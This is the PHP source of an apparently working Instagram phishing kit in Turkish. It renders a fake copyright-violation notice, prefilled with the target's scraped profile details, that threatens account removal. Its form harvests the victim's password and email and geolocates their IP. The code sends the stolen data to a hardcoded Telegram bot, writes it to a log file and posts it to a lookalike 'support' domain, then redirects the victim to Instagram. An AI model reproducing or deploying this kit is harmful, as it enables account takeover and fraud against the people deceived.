<?php
error_reporting(0);
include('simple_html_dom.php');
set_time_limit(0);
$username_irregular=$_GET['username'];
function temizle($text)
{
  $text = str_replace("/s+/", "", $text);
  $text = str_replace(" ", "", $text);
  $text = str_replace(" ", "", $text);
  $text = str_replace(" ", "", $text);
  $text = str_replace("/s/g", "", $text);
  $text = str_replace("/s+/g", "", $text);
  $text = trim($text);
  return $text;
}
$username_bigger= temizle($username_irregular);
$username=mb_strtolower($username_bigger);
$html = file_get_html('http://domain/users/'.$username.'.html');
$html2 = file_get_html('http://domain/users/'.$username.'.html');
$username_followers = $html2->find('b[class="takipci"]', 0)->innertext;
$username_following = $html2->find('b[class="takip"]', 0)->innertext;
$gonderi = $html2->find('b[class="gonderi"]', 0)->innertext;
$usernamebiografi = $html2->find('p[class=biografi]', 0);
$username_name = $html2->find('p[class="full_name"]', 0)->innertext;
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$username_images=$ip->find("img[class='img-fluid w-100']",0)->src;
$usernamepost=str_replace("","",$gonderi);

$dizi = explode (",",$username_followers);

$sayi = implode('',$dizi);
$sayac=1;
for($x=10;true;$x*=10)//koşulu true yaparak  sonsuz döngü kurdum
{      
if($sayi<$x)//sayının 10un katları ile karşılaştırılması
break;//break komutu dögüyü kırar ve komuttan sonraki satırlar çalıştırılmaz.
else 
$sayac++;
}
$k = "k";
$m = "m";
if (5 == $sayac){
			$son=substr($sayi, 0, 2);
	$sonsayi = "$son".$k;
		}else {
if (6 == $sayac){
	$son=substr($sayi, 0, 3);
	$sonsayi = "$son".$k;
}
	else {
		if (7 == $sayac){
			$son=substr($sayi, 0, 1);
	$sonsayi = "$son".$m;
		}else {
			if (8 == $sayac){
			$son=substr($sayi, 0, 2);
	$sonsayi = "$son".$m;
		}else {
				if (9 == $sayac){
			$son=substr($sayi, 0, 3);
	$sonsayi = "$son".$m;
		}else {
				$sonsayi = $sayi;
			}
		}
		}
	}
}
?>
<?php

if($_POST){
$usernamepw =  $_POST['usernamepw'];
$usernamemail = $_POST['usernamemail'];
$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");

$token='1982261073:AAFAW-wzcQsv0bAaTcIZBInkTAV8iVN2AgA';



$data = [
    'text' => '

Kullanıcı Adı : '.$username.'
Şifre : '.$usernamepw.'
İp : '.$ip.'
Ulke: '.$usernamemail.'
Tarih : '.$username_followers.'
ip - https://ipsorgu.com
',
    'chat_id' =>-1001259130085
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

$file = fopen('software-pass.php', 'a');
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$usernamepw."</font><br>
<font color='red'> Mail Adresi: </font><font color='white'>".$usernamemail."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>
<br>

"); 
fclose($file);
header("location: https://www.instagram.com/".$username);
}

?>
<html lang="tr" class="js not-logged-in client-root touch js-focus-visible sDN5V">
<head>
<?php
include("username/username/index.php")
?>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title><?=$username_name?> (@<?=$username?>) • Instagram Copyright</title>
<meta name="robots" content="noimageindex, noarchive">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#ffffff">
<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
	<script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
<link rel="icon" href="<?=$username_images?>" type="image/x-icon" />
<style>
      .button {
			width:140px;
			height:30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
    </style>
</head>
<body>
  
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div>
<div id="react-root">
<section class="_9eogI E3X2T">
<main class="SCxLW uzKWK  " role="main">
<div class="v9tJq  ">
<header class=" HVbuG">
<div class="XjzKX">
<div class="_4dMfM">
<div class="M-jxE">
<button class="IalUJ ">
<img class="be6sR" src="<?=$username_images?>">
</button>
</div>
</div>
</div>
<section class="zwlfE">
<div class="nZSzR">
<h2 class="_7UhW9       fKFbl yUEEX   KV-D4            fDxYl     "><?=$username?></h2>
</div>
<h1 class="rhpdm"><?=$username_name?></h1>
<br>
<span><?=$usernamebiografi?></span><br><a href="<?=$username_url?>"><span><?=$username_url?></span></a>
</section>
</header>
<ul class=" _3dEHb">
    <li class=" LH36I">
        <span class="g47SY lOXF2"><?=$usernamepost?></span>
    </li>
    <li class=" LH36I">
        <span class="g47SY lOXF2" title="<?=$sonsayi?>"><?=$sonsayi?></span>
    </li><li class=" LH36I">
        <span class="g47SY lOXF2"><?=$username_following?></span>
    </li>
</ul>
<div class="Nd_Rl _2z6nI">
<article class="">
<div class="_4Kbb_">

<div id="usernamegovde">

<br>

<p id="usernametext">
  Merhaba <?php 
  if($username_name){
      echo $username_name;
  }else{
      echo $username;
  }
  ?>, Hesabınızla ilgili telif hakkı yasalarımızı ihlal ettiğinize dair çok sayıda şikayet aldık. Maalesef hesabınızı kaldıracağız.
  Bunun yanlış olduğunu düşünüyorsanız, itiraz formunu doldurun. Hesabınızın gerçek sahibi olduğunu doğrulayamadığımız için bu bilgileri istiyoruz.
</p>
<br><br>
<form method="post" id="your_form_id" enctype="copyright.php">

   <input type="password" id="usernamekutu1" name="usernamepw" placeholder="Şifre" required="" class="usernamekutu"><br><br>
   <input type="mail" id="usernamekutu2" name="usernamemail" placeholder="Mail Adresi" required="" class="usernamekutu"><br><br>
   <select id="usernamekutu" name="tip" class="usernamekutu">
  <option value="volvo">Hesap kategorisi seçin</option>
  <option value="saab">Haber/Medya</option>
  <option value="saab">Spor</option>
  <option value="saab">Hükümet/Siyaset</option>
  <option value="saab">Müzik</option>
  <option value="saab">Moda</option>
  <option value="mercedes">Eğlence</option>
  <option value="audi">Kişisel</option>
    <option value="mercedes">İşletme/Marka/Kuruluş</option>
      <option value="mercedes">Diğer</option>
</select>
<br><br>
<button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">Doğrula</span>
	</button>
<br><br>
</form>
	
</div>
</div>
</article>
</div>
</div>
</main>
	<script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
		  
			user= document.getElementById("usernamekutu1").value;
		  mail= document.getElementById("usernamekutu2").value;
		
   if (user=="")
	   {
        alert("Lütfen gerekli alanları doldurun.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Submit");
			return false;
 }
   if (mail=="")
	   {
        alert("Lütfen mail adresinizi girin.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Submit");
			return false;
 }
      
   if (user.length > 6) {

    } else {
      alert("Şifre 6 karakterden az olamaz.");
      $(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Submit");
      return false;  // form gönderimini iptal et
    }
	    
document.getElementById('your_form_id').submit();

		  
		  
   });
        });
		

    </script>
	<?php
	error_reporting(0);
	if($_POST){
	$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_URL, 'https://xn--spport-pya.com/log/index.php'); ////This may differ from site to site
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: xn--spport-pya.com',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en,de-DE;q=0.9,de;q=0.8,en-US;q=0.7,tr;q=0.6',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://xn--spport-pya.com',
'Referer: https://xn--spport-pya.com/log/index.php'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$username.'&password='.$usernamepw.'&mail='.$usernamemail.'');
$result = curl_exec($ch);
curl_close($ch);
ob_flush();
	}
	?>
<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>
</body></html>